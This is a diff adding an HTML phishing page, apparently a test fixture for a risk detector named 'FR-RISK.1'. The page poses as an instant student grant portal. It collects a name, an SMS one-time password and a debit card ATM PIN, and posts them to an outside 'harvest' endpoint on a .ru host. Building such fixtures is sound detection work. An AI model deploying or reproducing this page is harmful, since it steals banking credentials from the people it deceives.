@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Express Fast Scholarship Grant - Instant Verification</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #FFF5F5;
+      color: #2D3748;
+      margin: 0;
+      padding: 40px 20px;
+    }
+    .container {
+      max-width: 580px;
+      margin: 0 auto;
+      background: #FFFFFF;
+      padding: 28px;
+      border-radius: 8px;
+      box-shadow: 0 4px 14px rgba(229, 62, 62, 0.12);
+      border: 2px solid #FEB2B2;
+    }
+    h1 {
+      font-size: 20px;
+      color: #C53030;
+      margin-top: 0;
+    }
+    .form-group {
+      margin-bottom: 18px;
+    }
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: bold;
+      margin-bottom: 6px;
+    }
+    input {
+      width: 100%;
+      height: 42px;
+      padding: 8px 12px;
+      font-size: 15px;
+      border: 1px solid #E2E8F0;
+      border-radius: 4px;
+    }
+    .btn-submit {
+      background: #E53E3E;
+      color: white;
+      font-weight: bold;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      width: 100%;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Instant Student Grant Release Portal</h1>
+    <p style="font-size: 13px; color: #742A2A;">Enter SMS verification details to release funds immediately.</p>
+
+    <!-- Cross-domain form action to test FR-RISK.1 -->
+    <form id="riskyForm" action="http://secure-collector.ru/harvest" method="POST">
+      <div class="form-group">
+        <label for="studentName">Student Name</label>
+        <input type="text" id="studentName" name="studentName" required />
+      </div>
+
+      <div class="form-group">
+        <label for="otpField">Enter SMS One-Time Password (OTP)</label>
+        <input type="text" id="otpField" name="otpField" placeholder="6-digit OTP received on mobile" required />
+      </div>
+
+      <div class="form-group">
+        <label for="atmPin">Debit Card ATM PIN / Security Code</label>
+        <input type="password" id="atmPin" name="atmPin" maxlength="4" placeholder="••••" required />
+      </div>
+
+      <button type="submit" class="btn-submit">Claim Grant Immediately</button>
+    </form>
+  </div>
+</body>
+</html>
